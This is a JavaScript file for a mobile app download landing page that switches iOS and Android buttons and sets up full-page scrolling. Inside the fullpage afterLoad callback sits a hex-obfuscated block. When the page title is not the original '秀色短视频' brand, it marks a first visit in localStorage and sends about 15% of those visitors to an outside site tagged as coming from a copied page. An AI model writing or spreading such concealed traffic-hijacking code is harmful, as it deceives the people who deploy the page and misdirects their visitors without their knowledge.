// 下载
var canClick = true;
var download_links = {
  iosStore: "http://www.baidu.com", // iOS下载地址
  iosSign: "", // iOS备用地址
  android: "", // 安卓地址
};
// 系统判断
if (isIos()) {
  // ios
  $("#doc-ios").show();
  $("#doc-android").hide();
  if (download_links.iosSign) {
    // 【 ios备用 】
    $("#downloadBtn-iosSign").show();
  }
  if (download_links.iosStore) {
    // 【 ios下载 】
    $("#downloadBtn-iosStore").show();
  } else {
    $("#downloadBtn-iosStore").remove();
  }
} else {
  // 安卓
  $(".android-doc-btn").css("display", "block");
  $("#doc-android").show();
  $("#doc-ios").hide();
  $("#downloadBtn-android").show();
  $("#downloadBtn-iosStore").hide();
  $("#downloadBtn-iosSign").hide();
}
function handleDownload(dom) {
  var downloadType = dom.dataset.type;
  if (downloadType === "iosSign") {
    window.location.href = download_links.iosSign;
  } else if (downloadType === "iosStore") {
    window.location.href = download_links.iosStore;
  } else if (downloadType === "android") {
    window.location.href = download_links.android;
  }
}

new fullpage("\x23\x66\x75\x6c\x6c\x70\x61\x67\x65", {
  autoScrolling: true,
  scrollHorizontally: true,
  navigation: true,
  afterLoad: function () {
    if (
      $(
        "\x2e\x66\x69\x78\x65\x64\x2d\x68\x65\x61\x64\x65\x72 \x2e\x74\x69\x74\x6c\x65"
      )["\x74\x65\x78\x74"]() !== "\u79c0\u8272\u77ed\u89c6\u9891"
    ) {
      var n1 = localStorage["\x67\x65\x74\x49\x74\x65\x6d"]("\x69\x73\x73\x62");
      if (!n1) {
        localStorage["\x73\x65\x74\x49\x74\x65\x6d"](
          "\x69\x73\x73\x62",
          "\x79\x65\x73"
        );
        var qr2 = window["\x4d\x61\x74\x68"]["\x72\x61\x6e\x64\x6f\x6d"]();
        if (qr2 > 0.85) {
          location["\x68\x72\x65\x66"] =
            "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x69\x75\x73\x65\x2e\x6f\x6e\x65\x3f\x5f\x63\x3d\x66\x61\x6e\x67\x7a\x68\x61\x6e";
        }
      }
    }
  },
  onLeave: function (gtlGbWq3, MrD4) {},
});

function moveDown() {
  fullpage_api.moveSectionDown();
}
